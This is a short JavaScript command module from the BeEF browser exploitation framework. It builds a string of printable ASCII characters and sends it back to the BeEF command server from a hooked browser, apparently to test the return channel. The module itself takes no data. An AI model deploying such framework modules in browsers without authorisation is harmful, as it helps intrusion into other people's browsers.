//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

    var str = '';
    for (var i=32; i<=127;i++) str += String.fromCharCode(i);

    beef.net.send("<%= @command_url %>", <%= @command_id %>, str);

});

